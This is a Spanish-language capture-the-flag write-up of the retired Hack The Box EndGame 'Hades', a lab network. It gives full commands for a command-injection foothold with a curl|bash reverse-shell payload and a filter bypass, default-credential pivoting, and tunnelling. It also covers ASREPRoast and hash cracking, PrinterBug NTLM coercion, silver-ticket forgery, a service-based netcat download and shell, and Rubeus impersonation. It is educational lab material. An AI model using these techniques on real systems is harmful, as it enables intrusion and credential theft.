---
title: "EndGame - Hades"
excerpt: "Se realizará un WriteUp del EndGame retirado Hades que cuenta con máquinas Windows. Desarrollaremos cada una paso a paso con el fin de entender y profundizar en nuevos conceptos."
header:
  teaser: "/assets/images/HADES - ENDGAME (1).gif"
categories:
  - WriteUp
---
<!-- Puedes usar HTML para la imagen y agregar una clase -->
<img src="{{ page.header.teaser }}" alt="Teaser image" class="teaser-img"> 

Iniciamos la máquina escaneando los puertos con nmap, encontrando solo un puerto abierto (443/tcp) correspondiente a un servicio web por HTTPS.

```bash
❯ nmap 10.13.38.16
Nmap scan report for 10.13.38.16  
PORT    STATE SERVICE
443/tcp open  https
```

En la página web encontramos varias pestañas, una de ellas es "SSL TOOLS", que contiene un checker de certificados SSL.

Usando `mitmdump`, escuchamos las peticiones al puerto 443 para capturar información del certificado.

```bash
❯ sudo mitmdump -p 443 --mode reverse:https://10.13.38.16 --ssl-insecure --set flow_detail=2  
```

Al hacer una petición contra nuestra dirección IP VPN, capturamos la cabecera `User-Agent`, que indica que la petición se emitió desde un comando `curl/7.58.0`.

```bash
❯ sudo mitmdump -p 443 --mode reverse:https://10.13.38.16 --ssl-insecure --set flow_detail=2  
```

Intentamos ejecutar un comando `$(id)` en la dirección web del servidor para obtener el usuario que lo ejecutó.

```bash
❯ sudo mitmdump -p 443 --mode reverse:https://10.13.38.16 --ssl-insecure --set flow_detail=1  
```

Para obtener una shell en la máquina, creamos un archivo `index.html` con una reverse shell en Bash y lo compartimos a través de un servidor HTTP de Python.

```bash
❯ cat index.html
bash -i >& /dev/tcp/10.10.14.10/443 0>&1

❯ sudo python3 -m http.server 80
```

Notamos una blacklist con caracteres, incluido el espacio, pero lo evadimos usando `${IFS}` en lugar de espacio.

```bash
10.10.14.10/$(curl${IFS}10.10.14.10|bash)
```

Al enviar la petición, se carga nuestro `index.html` con la reverse shell, obteniendo acceso como `www-data` y encontrando la primera flag.

```bash
❯ sudo netcat -lvnp 443
```

```plaintext
www-data@cee1146c7ac1:~/html/ssltools$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@cee1146c7ac1:~/html/ssltools$ hostname -I
172.17.0.2
www-data@cee1146c7ac1:~/html/ssltools$ ls
0fe092ba0_flag.txt  certificate.php  logo.png
www-data@cee1146c7ac1:~/html/ssltools$ cat 0fe092ba0_flag.txt  
HADES{Fr4**********Ng}
www-data@cee1146c7ac1:~/html/ssltools$
```
Se ha observado que estamos trabajando en un entorno dentro de un contenedor de Docker. La dirección IP asignada a este contenedor es **X.X.X.2**. Durante pruebas realizadas con credenciales por defecto en la dirección **X.X.X.1**, se logró acceder utilizando el usuario "docker".

Se ha detectado que se dispone de privilegios totales (ALL) en el archivo de configuración sudoers. Esto permite elevar los privilegios utilizando el comando `sudo su`, lo que nos otorga acceso como superusuario (root).

```zsh
www-data@cee1146c7ac1:~$ ssh docker@172.17.0.1
docker@172.17.0.1's password: tcuser
   ( '>')
  /) TC (\   Core is distributed with ABSOLUTELY NO WARRANTY.  
 (/-_--_-\)           www.tinycorelinux.net

docker@default:~$ id
uid=1000(docker) gid=50(staff) groups=50(staff),100(docker)
docker@default:~$ sudo su
root@default:~# id
uid=0(root) gid=0(root) groups=0(root)  
root@default:~#
```

Se han identificado cinco direcciones IP diferentes en las interfaces de red de este contenedor. Destaca especialmente la dirección **192.168.99.100** asignada a la interfaz **eth1**.

```shell
root@default:~# ifconfig
docker0   Link encap:Ethernet  HWaddr 02:42:57:6D:1C:4B
          inet addr:172.17.0.1  Bcast:172.17.255.255  Mask:255.255.0.0
          inet6 addr: fe80::42:57ff:fe6d:1c4b/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:5276 errors:0 dropped:0 overruns:0 frame:0
          TX packets:6767 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:483614 (472.2 KiB)  TX bytes:9003824 (8.5 MiB)

eth0      Link encap:Ethernet  HWaddr 08:00:27:20:AF:32
          inet addr:10.0.2.15  Bcast:10.0.2.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:fe20:af32/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:16931 errors:0 dropped:0 overruns:0 frame:0
          TX packets:6608 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:18015028 (17.1 MiB)  TX bytes:709915 (693.2 KiB)

eth1      Link encap:Ethernet  HWaddr 08:00:27:E6:B0:30
          inet addr:192.168.99.100  Bcast:192.168.99.255  Mask:255.255.255.0  
          inet6 addr: fe80::a00:27ff:fee6:b030/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:445 errors:0 dropped:0 overruns:0 frame:0
          TX packets:472 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:75865 (74.0 KiB)  TX bytes:221543 (216.3 KiB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)

veth9d30111 Link encap:Ethernet  HWaddr BA:FE:39:D2:E9:6D
          inet6 addr: fe80::b8fe:39ff:fed2:e96d/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:5276 errors:0 dropped:0 overruns:0 frame:0
          TX packets:6781 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:557478 (544.4 KiB)  TX bytes:9004900 (8.5 MiB)
```

Parece que estamos en un entorno de Active Directory (AD). Utilizando un binario estático de Nmap, se exploraron direcciones IP en el rango **192.168._._** buscando el puerto SMB (445/tcp). Se identificaron tres direcciones IP con este puerto abierto.

```bash
root@default:~# ./nmap -v -T5 -Pn -n -p 445 --open 192.168.*.*/24  
Nmap scan report for 192.168.3.201
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Nmap scan report for 192.168.3.202
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Nmap scan report for 192.168.3.203
PORT    STATE SERVICE
445/tcp open  microsoft-ds
```

Podemos aplicar un `escaneo` un poco mas largo para descubrir todos los `puertos` abiertos en cada uno de los 3 `hosts` windows que hemos encontrado anteriormente

```bash
root@default:~# ./nmap -T5 -Pn -n 192.168.3.201-203
Nmap scan report for 192.168.3.201
PORT     STATE SERVICE
135/tcp  open  loc-srv
445/tcp  open  microsoft-ds
5985/tcp open  unknown

Nmap scan report for 192.168.3.202
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  loc-srv
443/tcp  open  https
445/tcp  open  microsoft-ds
5985/tcp open  unknown

Nmap scan report for 192.168.3.203
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  loc-srv
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  unknown
```

Para establecer una conexión desde nuestro equipo, podemos emplear Ligolo-NG junto con el agente para acceder a nuestro sistema a través del puerto 11601 designado por el proxy. Una vez en el proxy, procedemos a obtener y señalar una sesión específica, para luego iniciar el túnel mediante el comando "start".

```bash
root@default:~# ./agent -connect 10.10.14.10:11601 -ignore-cert &
WARN[0000] warning, certificate validation disabled
INFO[0000] Connection established                 addr="10.10.14.10:11601"  
```

``` bash
❯ ./proxy -selfcert
WARN[0000] Using automatically generated self-signed certificates (Not recommended)  
INFO[0000] Listening on 0.0.0.0:11601
    __    _             __
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /
        /____/                          /____/

Made in France ♥ by @Nicocha30!

ligolo-ng »
INFO[0005] Agent joined.               name=root@default remote="10.13.38.16:49747"
ligolo-ng » session
? Specify a session : 1 - root@default - 10.13.38.16:49747
[Agent : root@default] » start
INFO[0021] Starting tunnel to root@default
[Agent : root@default] »
```

Hemos incorporado el segmento 192.168.3.0/24 a la interfaz de Ligolo, lo que nos permite establecer conexión con todos los equipos dentro del dominio. Podemos verificar esta conexión mediante el uso del comando ping.

```bash
❯ sudo ip route add 192.168.3.0/24 dev ligolo

❯ ping -c1 -w1 192.168.3.203
PING 192.168.3.203 (192.168.3.203) 56(84) bytes of data.
64 bytes from 192.168.3.203: icmp_seq=1 ttl=64 time=169 ms

--- 192.168.3.203 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms  
rtt min/avg/max/mdev = 169.346/169.346/169.346/0.000 ms
```

Tras configurar Ligolo, conseguimos establecer conexión con los tres equipos Windows. Utilizando CrackMapExec, identificamos los nombres de los equipos como DEV, WEB y DC1. Para mayor comodidad y preparación ante posibles ataques futuros, procederemos a añadir las direcciones IP junto con sus nombres de host y el dominio htb.local al archivo /etc/hosts.

```bash
❯ crackmapexec smb 192.168.3.201-203
SMB         192.168.3.201   445    DEV              [*] Windows Server 2019 Standard 17763 x64 (name:DEV) (domain:htb.local) (signing:False) (SMBv1:True)
SMB         192.168.3.202   445    WEB              [*] Windows Server 2012 R2 Standard 9600 x64 (name:WEB) (domain:htb.local) (signing:False) (SMBv1:True)  
SMB         192.168.3.203   445    DC1              [*] Windows 10.0 Build 17763 x64 (name:DC1) (domain:htb.local) (signing:True) (SMBv1:False)
❯ tail -n3 /etc/hosts
192.168.3.201 dev.htb.local
192.168.3.202 web.htb.local
192.168.3.203 dc1.htb.local htb.local 
```

Usando `kerbrute` podemos enumerar usuarios hacia el `DC` aplicando fuerza bruta

```bash
❯ kerbrute userenum -d htb.local --dc dc1.htb.local /usr/share/seclists/Usernames/Names/names.txt  
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

>  Using KDC(s):
>  	192.168.3.203:88

>  [+] VALID USERNAME:	 bob@htb.local
>  [+] VALID USERNAME:	 dev@htb.local
```

Después de identificar ambos usuarios, los guardamos en un archivo llamado users.txt. Luego, realizamos un intento de ASREPRoast hacia ambos usuarios utilizando GetNPUsers. Como resultado, obtenemos un hash para el usuario "bob". Utilizando la herramienta "john", procedemos a romper fácilmente el hash de "bob" y así obtener su contraseña.

```bash
❯ impacket-GetNPUsers htb.local/dc1.htb.local -no-pass -usersfile users.txt  
Impacket v0.11.0 - Copyright 2023 Fortra

$krb5asrep$23$bob@HTB.LOCAL:be52854293467eeb1900407ac6fef3ef$af612e3bbe242084e7095bb1bac4a6d6fa5b6607bc348655bd5ab20c057e17c21f785963c03c3207b33ee9a6d6f984ce01cad6e5416826a9fb5327fdf3853cb7c94151251445f533fbdab291d569a68c8ef1a44c807acbb424985f3274d9492656868d3922d25a744c3bbdc4deb543064ba4964175a4238ac1dcff471b890e254526b5bd4836281406cb2c927e26b17288e909be954dd0008b4ce998bc77cfd0795c8f50b56948adf24ab8f9ee9461e80f2e91178c1310fe1f1a8ceaaafe2b8d48393d9d20aeed3bd1966aadcdf2e4309dc1f774b7b6a195fc0a135c782cf2e9ec6b0108f73e  
[-] User dev doesn't have UF_DONT_REQUIRE_PREAUTH set

❯ john -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 XOP 4x2])  
Press 'q' or Ctrl-C to abort, almost any other key for status
Passw0rd1!       ($krb5asrep$23$bob@HTB.LOCAL)
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Después de obtener las contraseñas utilizando la herramienta "john", validamos las credenciales con crackmapexec. Al listar los recursos compartidos a nivel de SMB en DC1, observamos que ahora tenemos privilegios de lectura en el recurso "Users".

```bash
❯ crackmapexec smb dc1.htb.local -u bob -p Passw0rd1! --shares
SMB         dc1.htb.local   445    DC1              [*] Windows 10.0 Build 17763 x64 (name:DC1) (domain:htb.local) (signing:True) (SMBv1:False)  
SMB         dc1.htb.local   445    DC1              [+] htb.local\bob:Passw0rd1! 
SMB         dc1.htb.local   445    DC1              [+] Enumerated shares
SMB         dc1.htb.local   445    DC1              Share           Permissions     Remark
SMB         dc1.htb.local   445    DC1              -----           -----------     ------
SMB         dc1.htb.local   445    DC1              ADMIN$                          Remote Admin
SMB         dc1.htb.local   445    DC1              C$                              Default share
SMB         dc1.htb.local   445    DC1              IPC$            READ            Remote IPC
SMB         dc1.htb.local   445    DC1              NETLOGON        READ            Logon server share 
SMB         dc1.htb.local   445    DC1              SYSVOL          READ            Logon server share 
SMB         dc1.htb.local   445    DC1              Users           READ
```

Nos conectamos simplemente con smbclient y navegamos dentro del recurso "Users". Encontramos un directorio llamado "bob" que contiene el archivo flag.txt. Procedemos a descargar este archivo utilizando el comando "get" y luego lo leemos para obtener su contenido.

```bash
❯ impacket-smbclient htb.local/bob:'Passw0rd1!'@dc1.htb.local  
Impacket v0.11.0 - Copyright 2023 Fortra

Type help for list of commands
# use Users
# ls
drw-rw-rw-          0  Fri Sep  6 05:50:58 2019 .
drw-rw-rw-          0  Fri Sep  6 05:50:58 2019 ..
drw-rw-rw-          0  Fri Sep  6 06:10:00 2019 bob
# cd bob
# ls
drw-rw-rw-          0  Fri Sep  6 06:10:00 2019 .
drw-rw-rw-          0  Fri Sep  6 06:10:00 2019 ..
-rw-rw-rw-         47  Fri Sep  6 06:10:54 2019 flag.txt
# get flag.txt
# exit

❯ cat flag.txt
HADES{DoNt_d1s4b*******e_aUth3nticat1on}
```

Al listar algunos servicios con rcpdump, identificamos que está en ejecución uno bastante conocido, que es el servicio MS-RPRN asociado a spoolsv.exe. Para ajustarnos a los cracker más conocidos que utilizan tablas precomputadas, modificaremos el desafío de respuesta a 1122334455667788.

```bash
❯ impacket-rpcdump htb.local/bob:'Passw0rd1!'@dev.htb.local | grep MS-RPRN -A2  
Protocol: [MS-RPRN]: Print System Remote Protocol
Provider: spoolsv.exe
UUID    : 12345678-1234-ABCD-EF00-0123456789AB v1.0
❯ grep Challenge /etc/responder/Responder.conf  
Challenge = 1122334455667788
```

Ahora, utilizando el comando "responder", nos ponemos en escucha de tráfico, especificando la interfaz tun0 y utilizando el parámetro --lm para forzar el downgrade hacia versiones antiguas. Utilizaremos pringerbug con las credenciales que tenemos previamente verificadas como válidas en el dominio para realizar una solicitud a nuestro host a través de RPC.

```bash
❯ sudo responder -I tun0 --lm
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|  
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

[+] Listening for events...
```

```bash
❯ python3 printerbug.py htb.local/bob:'Passw0rd1!'@dev.htb.local 10.10.14.10
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Attempting to trigger authentication via rprn RPC at dev.htb.local
[*] Bind OK
[*] Got handle
RPRN SessionError: code: 0x6ba - RPC_S_SERVER_UNAVAILABLE - The RPC server is unavailable.  
[*] Triggered RPC backconnect, this may or may not have worked
```

Regresamos a escuchar con "responder" y notamos que el equipo DEV$ ha realizado una autenticación hacia nuestro host, y hemos recibido su hash en el formato NTLMv1.

```bash
❯ sudo responder -I tun0 --lm
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

[+] Listening for events...

[SMB] NTLMv1 Client   : 10.13.38.17
[SMB] NTLMv1 Username : HTB\DEV$
[SMB] NTLMv1 Hash     : DEV$::HTB:A7509E055B9C053829A4802EA4DB0F1A9622805EF63409D5:A7509E055B9C053829A4802EA4DB0F1A9622805EF63409D5:1122334455667788  
```

Dado que la fuerza bruta probablemente requeriría mucho tiempo, utilizaremos crack.sh. Le proporcionaremos nuestro correo y pasaremos nuestro hash en el siguiente formato. Pasados unos minutos, recibiremos un correo de crack.sh con los resultados de la solicitud, donde ha logrado obtener el hash NT con la entrada que enviamos. Podemos confirmar con crackmapexec que el hash NT que recibimos es válido para autenticarnos contra el equipo DEV$ perteneciente al dominio htb.local.

```bash
❯ crackmapexec smb dev.htb.local -u DEV$ -H 01300a3009c7ae1af0ea216ebada48ad
SMB         dev.htb.local   445    DEV              [*] Windows Server 2019 Standard 17763 x64 (name:DEV) (domain:htb.local) (signing:False) (SMBv1:True)  
SMB         dev.htb.local   445    DEV              [+] htb.local\DEV$:01300a3009c7ae1af0ea216ebada48ad
```

Para poder suplantar al Administrador mediante un silver ticket, primero necesitamos obtener el SID del dominio. Con el SID y el hash, utilizaremos esta información para crear un nuevo ticket con la herramienta ticketer, destinado al SPN (Service Principal Name) CIFS de DEV, suplantando al Administrador. Posteriormente, exportaremos este ticket para autenticarnos con él.

```bash
❯ impacket-getPac htb.local/bob:Passw0rd1! -targetUser bob | grep SID  
Domain SID: S-1-5-21-4266912945-3985045794-2943778634
❯ impacket-ticketer -nthash 01300a3009c7ae1af0ea216ebada48ad -domain-sid S-1-5-21-4266912945-3985045794-2943778634 -domain htb.local -spn cifs/dev.htb.local Administrator  
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for htb.local/Administrator
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Saving ticket in Administrator.ccache

❯ export KRB5CCNAME=Administrator.ccache
```

A pesar de que crackmapexec confirma la autenticación con el ticket y nos devuelve "Pwn3d!", lamentablemente carecemos de privilegios de escritura en los recursos SMB, lo que nos impide obtener una shell utilizando herramientas como psexec.

```bash
❯ crackmapexec smb dev.htb.local -k --use-kcache
SMB         dev.htb.local   445    DEV              [*] Windows Server 2019 Standard 17763 x64 (name:DEV) (domain:htb.local) (signing:False) (SMBv1:True)  
SMB         dev.htb.local   445    DEV              [+] htb.local\ from ccache (Pwn3d!)

❯ crackmapexec smb dev.htb.local -k --use-kcache --shares
SMB         dev.htb.local   445    DEV              [*] Windows Server 2019 Standard 17763 x64 (name:DEV) (domain:htb.local) (signing:False) (SMBv1:True)  
SMB         dev.htb.local   445    DEV              [+] htb.local\ from ccache (Pwn3d!)
SMB         dev.htb.local   445    DEV              [+] Enumerated shares
SMB         dev.htb.local   445    DEV              Share           Permissions     Remark
SMB         dev.htb.local   445    DEV              -----           -----------     ------
SMB         dev.htb.local   445    DEV              IPC$                            Remote IPC
```

Si intentamos dumpear la SAM con secretsdump, nos encontramos con un pequeño error.

```bash
❯ impacket-secretsdump dev.htb.local -k -no-pass
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0xe4b2298c95677ce18cd2198b9a36c7df
[-] SAM hashes extraction failed: SMB SessionError: STATUS_BAD_NETWORK_NAME({Network Name Not Found} The specified share name cannot be found on the remote server.)  
[-] LSA hashes extraction failed: SMB SessionError: STATUS_BAD_NETWORK_NAME({Network Name Not Found} The specified share name cannot be found on the remote server.)  
[*] Cleaning up...
```

Como observamos en la máquina Resolute, el hecho de que crackmapexec devuelva "Pwn3d!" indica privilegios a nivel de servicios y no necesariamente de recursos SMB. Por lo tanto, aprovecharemos esta situación. Podemos utilizar "services" para crear un nuevo servicio llamado "netcat" que ejecutará un comando curl hacia nuestro host para descargar el archivo netcat.exe en la máquina objetivo.

```python
try:
    # 0xF003F - SC_MANAGER_ALL_ACCESS
    # http://msdn.microsoft.com/en-us/library/windows/desktop/ms685981(v=vs.85).aspx
    ans = scmr.hROpenSCManagerW(dce,'{}\x00'.format(self.host),'ServicesActive\x00', 0xF003F)  
    self.admin_privs = True
except scmr.DCERPCException as e:
    self.admin_privs = False
    pass
```

```bash
❯ impacket-services dev.htb.local -k -no-pass create -name netcat -display netcat -path 'curl 10.10.14.10/netcat.exe -o C:\ProgramData\netcat.exe'  
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Creating service netcat
```

Una vez que utilizamos la función "start" para ejecutar el servicio "netcat" que creamos anteriormente, recibimos una solicitud del netcat.exe en nuestra máquina, lo que indica que el netcat se ha descargado y hemos logrado ejecutar comandos en la máquina DEV.

Ahora, procedemos a crear un servicio llamado "shell" que ejecute el netcat.exe para enviar una sesión de PowerShell a nuestro host a través del puerto 443. Luego, lo ejecutamos.

```powershell
❯ sudo netcat -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.13.38.17
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.  

PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32>
```

Para prevenir posibles problemas, añadiremos todas las direcciones de los ordenadores que forman parte del dominio htb.local al archivo hosts de nuestro sistema Windows.

Luego, regresando a PowerShell, utilizaremos Rubeus para especificar el hash del ordenador DEV$ suplantando al usuario Administrator. Al hacerlo, se nos importará un nuevo ticket.

```powershell
PS C:\Users\pc1\Desktop> .\Rubeus.exe s4u /user:DEV$ /rc4:01300a3009c7ae1af0ea216ebada48ad /impersonateuser:Administrator /altservice:http/dev.htb.local /domain:htb.local /dc:dc1.htb.local /self /ptt  

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: S4U

[*] Using rc4_hmac hash: 01300a3009c7ae1af0ea216ebada48ad
[*] Building AS-REQ (w/ preauth) for: 'htb.local\DEV$'
[*] Using domain controller: 192.168.3.203:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIEqDCCBKSgAwIBBaEDAgEWooIDyjCCA8ZhggPCMIIDvqADAgEFoQsbCUhUQi5MT0NBTKIeMBygAwIB
      AqEVMBMbBmtyYnRndBsJaHRiLmxvY2Fso4IDiDCCA4SgAwIBEqEDAgECooIDdgSCA3JKyHcUrYMJcYfs
      QxvIvmpxxBOfF22g1CmzCoOGGyB7AlV47xpLdnHpOCOuEbVyXp0lPo00JpROPl8dB7ecHXAaJeR2s6GP
      Pps2OS0FZyYUPaifSBm/ZPgaoADahq6D/PEpUDgGNFYeT6KDVja6SDJDrIFBRIW7+VWB6KTL0XLityM3
      7xSZDGtiWslaIPvNG7I2w0mXBKfAY4bDKBCxtMQUZTzk9EF8mBd1Kf1CLek/Lc/BqkvWofbY8MWnj4DA
      0DOCGr5olBHujVQ5rXNrwaNACn3Tfui2s2/pAXoFLvEqTC3j7SmbWRUndRplfXyesCoOrIo/cg6Nti75
      6++YWoU6vXIPcGCdJKcjhTtMszlB9R6wPhn2HoeSrWP17XsL+zxPwdKBHz6IbE9Q7OQzjFoGZCYuT4Os
      n36YJm9O3KnnwUv3TBUO4epeE8Qp6skJln8vHqWrsVC/VS85dmP31QzWmdGy1TN05T7Z/7poXGjZwhmG
      0wVoqQ+9gJV+DsLUvdl9A0UMUQdySfrKF5wA4uZmg+FEen+itP+Vd39uXCkGJqWxpH07LHMhsZW5zVHk
      lNJYKKglVcJVuOE7G/YgNg/e5yvt3Gg8dgSHYBna1EnUyPe7E1QDEFLJRKsee4Lve0amVErHUzRW94MV
      q3PIOL09hE4ZvcI0YsCMibAufegMZjzEFv1FoW70i+B+YLa6NcbBvuwVK8QdKmzdXbWXB10DAiaBYvCC
      d04m/KHTS0Utmi2llW2Ka6Pcs0cAHNJuAVkuAhZS6dAmvWJLlIkkYgOggKFVCPn0N2E1u4Z4EEp65hI5
      rBVsoBmXN9usCORL3ViQKB8NSLQ5y+RKfOKIWCxy/DWIawJqeiXQ/eRiMmeEKQfVpg4dWiDSa/LU44Gj
      KZcXabRyDQM4/yLPH3sllZB6PTya046RHOlyyyyBWO+NaqGoMUG7ZTUcTzw+F/OUtB8GlfSr+0yKq1R9
      RiHBEtRPbEhzb20X6MLsi7M1ESa1lCmfTwx58ZD8lfr8ZctSec33EsWATr/adAnxPxPSez9T587KVq6/
      z1uRfZn/O2/lNPtcUxERlEhpY2/+qBZTFQuB6lqV4S+ewtLi6KCtmOdPeqsyBz+sJSJkUdWh0dL4i6+o
      LAoseAmPd8vRyNlHWGnS4ArqnoCUt/drUSXIalwmo0ujgckwgcagAwIBAKKBvgSBu32BuDCBtaCBsjCB
      rzCBrKAbMBmgAwIBF6ESBBBw/o7YqKq6gSfGuv70LH4poQsbCUhUQi5MT0NBTKIRMA+gAwIBAaEIMAYb
      BERFViSjBwMFAEDhAAClERgPMjAyMzA0MzAwMzI4MDFaphEYDzIwMjMwNDMwMTMyODAxWqcRGA8yMDIz
      MDUwNzAzMjgwMVqoCxsJSFRCLkxPQ0FMqR4wHKADAgECoRUwExsGa3JidGd0GwlodGIubG9jYWw=


[*] Action: S4U

[*] Building S4U2self request for: 'DEV$@HTB.LOCAL'
[*] Using domain controller: dc1.htb.local (192.168.3.203)
[*] Sending S4U2self request to 192.168.3.203:88
[+] S4U2self success!
[*] Substituting alternative service name 'http/dev.htb.local'
[*] Got a TGS for 'administrator' to 'http@HTB.LOCAL'
[*] base64(ticket.kirbi):

      doIFXjCCBVqgAwIBBaEDAgEWooIEZTCCBGFhggRdMIIEWaADAgEFoQsbCUhUQi5MT0NBTKIgMB6gAwIB
      AaEXMBUbBGh0dHAbDWRldi5odGIubG9jYWyjggQhMIIEHaADAgESoQMCAQeiggQPBIIEC54azxOCgCG1
      w96Bc6TrM/dBqTSNvwfFAupxumsLYdMU6sTVcsB0nFBfhGwvFrjzw/Hl8nNnWjGYq5T7k68v75Ha3vIi
      2hv/2lMwOmAL/+3s0bywlsIB1NOVQojLTVp/DvVrT6a/b35kSUE40FxEjjj9Bwqps8L+hYoKX5MfSZZN
      Kv5vApyYOTiTqXEOf9ZraY2MidY3HjhHcWYSXOwaDaN4BeuQlzsR2hbuttw6kudQUw0duibXKNg3dz6D
      Pat+XGYsphghc41qVJUujKWgahW8Y1B20+NUYwJR61OKS4bU0URenimt143szOKD78PPBksgB4hBp0ca
      AUeM9GXG2OKhKGrqT3YHod51vFFievSo6uHRSeAXa4g+zp0RPgDDTIzQi99715sUhu6EfQIMIht8eiRc
      6c5zNETD0HXPGPdEf/8uKEyX8sg7vgEUrHCslB2U4pHEltQXpxxkUjCs4mw2CJkaun5HbeFQ7SofOYBP
      FqFGfUrv+MijzG+aLRzJ3ACgtLHW+YR3zKM+ZN+okrReT6GhVZZQxgcXJR0cuHbehbORV6DyJvZd7nnd
      Kq/iKh2jR5fh1zJLdkZSMO8tOPUzhV9SvznGJj0TOMzpfzAXZ4P4wPGnRSNtmZP76/7C98XnzzrJousO
      fRD3EVyLhglHNQd1WbARIX44ExY7cHTLlGQRnJUQ95okVmpGJgTO2/NOXkP3cJitiqYQKDgnmAqjfLwa
      5VFncZ5ABQgIS7vjxF6kkAYfReNqKY8TaNtH5I1g9GYJ7Qm4KwqAbGVClh0aayz69f+geiDLP7PES3E9
      GFgD9ko4wKqyvNGZsEVsSkQgxq98NUmAmKOu4KBprVC8r6/jO8yqFbAXUR0MwoT0Yjb8tDTsEbw23iBD
      JEOZqcufDtqqrENavVkt6AKAUk+lT0JvXJYH6aJFw6O6Np7QDW3u8k04d2+epuWOPYAmZe7hsC6u9Y/8
      Sth1W5eVjLuQBoY+GmLVkvbi89H4d8QXmjpQ/Cd3c5aLHevdZANGzLechotR8qnblugrlSXfbMCHjfh/
      6QnFtaaqt4qplSzf6/lMDNdXYYcq2vk+4gFSG1bEg3D81xAlqlHn1yzL1F8eQBzOaks+N+OvXEjD3Hh9
      RjAXk7vc1YDK48oM5y9VfWkLfpNPy0yxKSMa3Tf5GJisX00s7PH5jiWnf++fF6LQBYZ4Alp/7xy4NTmT
      eXPpUmL/5toocIjK3WMD+odn4zOwBYG3I8zgx5A7r4RtYWlc6XTFH6K/biFiKKbc27WD1L5kyRbdFOaW
      14NgWMlODdPg/D8z8Zp99Mgbw78pz+lwJde9evdI8LE1s6kaPO45PR+E4PBBzHRPDGzu8FvOWlu0CWoR
      w3aN4InegqOB5DCB4aADAgEAooHZBIHWfYHTMIHQoIHNMIHKMIHHoCswKaADAgESoSIEINwGLNlsEGJR
      WkijUFG4GWTED++soOLAnJZPjv4HG7n9oQsbCUhUQi5MT0NBTKIaMBigAwIBCqERMA8bDWFkbWluaXN0
      cmF0b3KjBwMFAAChAAClERgPMjAyMzA0MzAwMzI4MDJaphEYDzIwMjMwNDMwMTMyODAxWqcRGA8yMDIz
      MDUwNzAzMjgwMVqoCxsJSFRCLkxPQ0FMqSAwHqADAgEBoRcwFRsEaHR0cBsNZGV2Lmh0Yi5sb2NhbA==

[+] Ticket successfully imported!

PS C:\Users\pc1\Desktop>
```

Una vez importado el ticket, utilizamos Enter-PSSession para conectarnos a dev.htb.local, lo cual se autenticará con el ticket y nos proporcionará una sesión de PowerShell como Administrador.

